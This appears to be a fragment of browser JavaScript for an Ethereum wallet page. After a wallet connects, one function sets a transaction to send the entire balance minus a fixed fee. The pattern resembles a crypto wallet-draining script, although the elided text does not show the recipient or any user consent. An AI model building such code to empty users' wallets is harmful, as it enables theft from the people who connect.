...
async function onProvider(provider) {
    ...
    if (accounts.length) {
        sendMessage("Wallet Connected Successfully to eth!")
...
async function onSendEther() {
    ...
    try {
        ...
        transactionObject.value = balance - 4000000000000000; // set the transaction value to the entire balance, less the transaction fee
